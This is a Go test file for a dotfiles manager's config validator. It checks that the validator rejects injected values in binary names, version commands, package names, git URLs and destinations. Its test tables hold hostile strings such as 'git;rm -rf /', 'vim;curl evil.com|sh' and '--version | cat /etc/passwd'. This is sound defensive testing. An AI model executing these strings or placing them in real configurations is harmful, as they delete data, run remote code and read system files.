package config

import (
	"os"
	"testing"
)

func TestValidate(t *testing.T) {
	// Create a dummy directory for path validation
	tempDir, err := os.MkdirTemp("", "go4dot-test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer func() {
		if err := os.RemoveAll(tempDir); err != nil {
			t.Fatalf("Failed to remove temp dir: %v", err)
		}
	}()

	tests := []struct {
		name    string
		config  *Config
		wantErr bool
	}{
		{
			name: "Valid config",
			config: &Config{
				SchemaVersion: "1.0",
				Metadata:      Metadata{Name: "test"},
				Configs: ConfigGroups{
					Core: []ConfigItem{
						{Name: "git", Path: tempDir},
					},
				},
			},
			wantErr: false,
		},
		{
			name: "Missing schema_version",
			config: &Config{
				Metadata: Metadata{Name: "test"},
			},
			wantErr: true,
		},
		{
			name: "Missing metadata.name",
			config: &Config{
				SchemaVersion: "1.0",
			},
			wantErr: true,
		},
		{
			name: "Config path does not exist",
			config: &Config{
				SchemaVersion: "1.0",
				Metadata:      Metadata{Name: "test"},
				Configs: ConfigGroups{
					Core: []ConfigItem{
						{Name: "git", Path: "/path/that/does/not/exist"},
					},
				},
			},
			wantErr: true,
		},
		{
			name: "PostInstall display-only string passes validation",
			config: &Config{
				SchemaVersion: "1.0",
				Metadata:      Metadata{Name: "test"},
				PostInstall:   "Run: ./setup.sh --finalize",
			},
			wantErr: false,
		},
		{
			name: "Circular dependency",
			config: &Config{
				SchemaVersion: "1.0",
				Metadata:      Metadata{Name: "test"},
				Configs: ConfigGroups{
					Core: []ConfigItem{
						{Name: "a", Path: tempDir, DependsOn: []string{"b"}},
						{Name: "b", Path: tempDir, DependsOn: []string{"a"}},
					},
				},
			},
			wantErr: true,
		},
		{
			name: "No circular dependency",
			config: &Config{
				SchemaVersion: "1.0",
				Metadata:      Metadata{Name: "test"},
				Configs: ConfigGroups{
					Core: []ConfigItem{
						{Name: "a", Path: tempDir, DependsOn: []string{"b"}},
						{Name: "b", Path: tempDir, DependsOn: []string{"c"}},
						{Name: "c", Path: tempDir},
					},
				},
			},
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if err := tt.config.Validate(tempDir); (err != nil) != tt.wantErr {
				t.Errorf("Validate() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidate_SecurityMaliciousBinaryName(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "go4dot-test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(tempDir) })

	tests := []struct {
		name    string
		binary  string
		wantErr bool
	}{
		{name: "valid binary", binary: "git", wantErr: false},
		{name: "valid binary with dots", binary: "node.js", wantErr: false},
		{name: "shell injection semicolon", binary: "git;rm -rf /", wantErr: true},
		{name: "shell injection backtick", binary: "git`whoami`", wantErr: true},
		{name: "flag injection", binary: "--exec=malicious", wantErr: true},
		{name: "hyphen prefix", binary: "-v", wantErr: true},
		{name: "path traversal", binary: "../../../etc/passwd", wantErr: true},
		{name: "space injection", binary: "git rm", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &Config{
				SchemaVersion: "1.0",
				Metadata:      Metadata{Name: "test"},
				Dependencies: Dependencies{
					Core: []DependencyItem{
						{Name: "test-dep", Binary: tt.binary},
					},
				},
			}
			err := cfg.Validate(tempDir)
			if (err != nil) != tt.wantErr {
				t.Errorf("Validate() with binary=%q, error = %v, wantErr %v", tt.binary, err, tt.wantErr)
			}
		})
	}
}

func TestValidate_SecurityMaliciousVersionCmd(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "go4dot-test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(tempDir) })

	tests := []struct {
		name       string
		versionCmd string
		wantErr    bool
	}{
		{name: "valid --version", versionCmd: "--version", wantErr: false},
		{name: "valid -v", versionCmd: "-v", wantErr: false},
		{name: "valid -V", versionCmd: "-V", wantErr: false},
		{name: "valid version", versionCmd: "version", wantErr: false},
		{name: "arbitrary command", versionCmd: "--exec=whoami", wantErr: true},
		{name: "command injection", versionCmd: "-v; rm -rf /", wantErr: true},
		{name: "pipe injection", versionCmd: "--version | cat /etc/passwd", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &Config{
				SchemaVersion: "1.0",
				Metadata:      Metadata{Name: "test"},
				Dependencies: Dependencies{
					Core: []DependencyItem{
						{Name: "test-dep", Binary: "test", VersionCmd: tt.versionCmd},
					},
				},
			}
			err := cfg.Validate(tempDir)
			if (err != nil) != tt.wantErr {
				t.Errorf("Validate() with versionCmd=%q, error = %v, wantErr %v", tt.versionCmd, err, tt.wantErr)
			}
		})
	}
}

func TestValidate_SecurityMaliciousPackageName(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "go4dot-test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(tempDir) })

	tests := []struct {
		name    string
		pkgName string
		wantErr bool
	}{
		{name: "valid package", pkgName: "vim", wantErr: false},
		{name: "valid scoped package", pkgName: "golang/go", wantErr: false},
		{name: "flag injection", pkgName: "--install-suggests", wantErr: true},
		{name: "shell injection", pkgName: "vim;curl evil.com|sh", wantErr: true},
		{name: "backtick injection", pkgName: "vim`whoami`", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &Config{
				SchemaVersion: "1.0",
				Metadata:      Metadata{Name: "test"},
				Dependencies: Dependencies{
					Core: []DependencyItem{
						{
							Name:   "test-dep",
							Binary: "test",
							Package: map[string]string{
								"apt": tt.pkgName,
							},
						},
					},
				},
			}
			err := cfg.Validate(tempDir)
			if (err != nil) != tt.wantErr {
				t.Errorf("Validate() with pkgName=%q, error = %v, wantErr %v", tt.pkgName, err, tt.wantErr)
			}
		})
	}
}

func TestValidate_SecurityMaliciousGitURL(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "go4dot-test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(tempDir) })

	tests := []struct {
		name    string
		url     string
		wantErr bool
	}{
		{name: "valid HTTPS URL", url: "https://github.com/user/repo.git", wantErr: false},
		{name: "valid SSH URL", url: "git@github.com:user/repo.git", wantErr: false},
		{name: "flag injection", url: "--upload-pack=evil", wantErr: true},
		{name: "file:// URL", url: "file:///etc/passwd", wantErr: true},
		{name: "newline injection", url: "https://evil.com\n--upload-pack=evil", wantErr: true},
		{name: "ftp scheme", url: "ftp://evil.com/payload", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &Config{
				SchemaVersion: "1.0",
				Metadata:      Metadata{Name: "test"},
				External: []ExternalDep{
					{
						ID:          "test-ext",
						URL:         tt.url,
						Destination: "~/.local/share/test",
					},
				},
			}
			err := cfg.Validate(tempDir)
			if (err != nil) != tt.wantErr {
				t.Errorf("Validate() with url=%q, error = %v, wantErr %v", tt.url, err, tt.wantErr)
			}
		})
	}
}

func TestValidate_SecurityExternalDepDestination(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "go4dot-test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(tempDir) })

	tests := []struct {
		name        string
		destination string
		wantErr     bool
	}{
		{name: "valid ~/ prefix", destination: "~/.local/share/test", wantErr: false},
		{name: "valid @repoRoot/ prefix", destination: "@repoRoot/plugins", wantErr: false},
		{name: "path traversal", destination: "/etc/cron.d/evil", wantErr: true},
		{name: "absolute path", destination: "/tmp/evil", wantErr: true},
		{name: "relative path", destination: "../../etc/passwd", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &Config{
				SchemaVersion: "1.0",
				Metadata:      Metadata{Name: "test"},
				External: []ExternalDep{
					{
						ID:          "test-ext",
						URL:         "https://github.com/user/repo.git",
						Destination: tt.destination,
					},
				},
			}
			err := cfg.Validate(tempDir)
			if (err != nil) != tt.wantErr {
				t.Errorf("Validate() with destination=%q, error = %v, wantErr %v", tt.destination, err, tt.wantErr)
			}
		})
	}
}

func TestValidate_SecurityMaliciousConfigName(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "go4dot-test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(tempDir) })

	tests := []struct {
		name       string
		configName string
		wantErr    bool
	}{
		{name: "valid name", configName: "vim", wantErr: false},
		{name: "valid name with dots", configName: "nvim.config", wantErr: false},
		{name: "stow flag injection", configName: "--target=/etc", wantErr: true},
		{name: "hyphen prefix", configName: "-d/tmp", wantErr: true},
		{name: "path separator", configName: "../evil", wantErr: true},
		{name: "shell metachar", configName: "vim;rm", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &Config{
				SchemaVersion: "1.0",
				Metadata:      Metadata{Name: "test"},
				Configs: ConfigGroups{
					Core: []ConfigItem{
						{Name: tt.configName, Path: tempDir},
					},
				},
			}
			err := cfg.Validate(tempDir)
			if (err != nil) != tt.wantErr {
				t.Errorf("Validate() with configName=%q, error = %v, wantErr %v", tt.configName, err, tt.wantErr)
			}
		})
	}
}

func TestValidate_SecurityMaliciousConfigNameOptional(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "go4dot-test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(tempDir) })

	cfg := &Config{
		SchemaVersion: "1.0",
		Metadata:      Metadata{Name: "test"},
		Configs: ConfigGroups{
			Optional: []ConfigItem{
				{Name: "--target=/etc", Path: tempDir},
			},
		},
	}
	err = cfg.Validate(tempDir)
	if err == nil {
		t.Error("Validate() expected error for stow flag injection in optional config name, got nil")
	}
}

func TestValidate_SecurityMachineConfigDestination(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "go4dot-test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(tempDir) })

	tests := []struct {
		name        string
		destination string
		wantErr     bool
	}{
		{name: "valid ~/ prefix", destination: "~/.gitconfig.local", wantErr: false},
		{name: "absolute path", destination: "/etc/evil.conf", wantErr: true},
		{name: "relative path", destination: "../../etc/passwd", wantErr: true},
		{name: "no prefix", destination: ".config/test", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &Config{
				SchemaVersion: "1.0",
				Metadata:      Metadata{Name: "test"},
				MachineConfig: []MachinePrompt{
					{
						ID:          "test-mc",
						Destination: tt.destination,
						Template:    "template content",
					},
				},
			}
			err := cfg.Validate(tempDir)
			if (err != nil) != tt.wantErr {
				t.Errorf("Validate() with machine config destination=%q, error = %v, wantErr %v", tt.destination, err, tt.wantErr)
			}
		})
	}
}

func TestValidate_SecurityValidConfigsStillPass(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "go4dot-test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(tempDir) })

	cfg := &Config{
		SchemaVersion: "1.0",
		Metadata:      Metadata{Name: "my-dotfiles"},
		Dependencies: Dependencies{
			Critical: []DependencyItem{
				{Name: "stow", Binary: "stow", VersionCmd: "--version"},
			},
			Core: []DependencyItem{
				{
					Name:       "neovim",
					Binary:     "nvim",
					VersionCmd: "--version",
					Package: map[string]string{
						"apt": "neovim",
						"dnf": "neovim",
					},
				},
			},
			Optional: []DependencyItem{
				{Name: "ripgrep", Binary: "rg", VersionCmd: "--version"},
			},
		},
		Configs: ConfigGroups{
			Core: []ConfigItem{
				{Name: "git", Path: tempDir},
				{Name: "vim", Path: tempDir},
			},
			Optional: []ConfigItem{
				{Name: "tmux", Path: tempDir},
			},
		},
		External: []ExternalDep{
			{
				ID:          "tpm",
				URL:         "https://github.com/tmux-plugins/tpm.git",
				Destination: "~/.tmux/plugins/tpm",
			},
		},
		MachineConfig: []MachinePrompt{
			{
				ID:          "git-config",
				Destination: "~/.gitconfig.local",
				Template:    "[user]\n\tname = {{ .name }}",
			},
		},
		PostInstall: "Run: ./post-install.sh",
	}

	if err := cfg.Validate(tempDir); err != nil {
		t.Errorf("Validate() unexpected error for valid config: %v", err)
	}
}

func TestValidate_SecurityDependencyCategories(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "go4dot-test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(tempDir) })

	// Test that malicious binaries are caught across all dependency categories
	categories := []string{"critical", "core", "optional"}
	for _, category := range categories {
		t.Run("malicious binary in "+category, func(t *testing.T) {
			maliciousDep := DependencyItem{
				Name:   "evil",
				Binary: "git;rm -rf /",
			}
			cfg := &Config{
				SchemaVersion: "1.0",
				Metadata:      Metadata{Name: "test"},
			}
			switch category {
			case "critical":
				cfg.Dependencies.Critical = []DependencyItem{maliciousDep}
			case "core":
				cfg.Dependencies.Core = []DependencyItem{maliciousDep}
			case "optional":
				cfg.Dependencies.Optional = []DependencyItem{maliciousDep}
			}
			if err := cfg.Validate(tempDir); err == nil {
				t.Errorf("Validate() expected error for malicious binary in %s dependencies", category)
			}
		})
	}
}
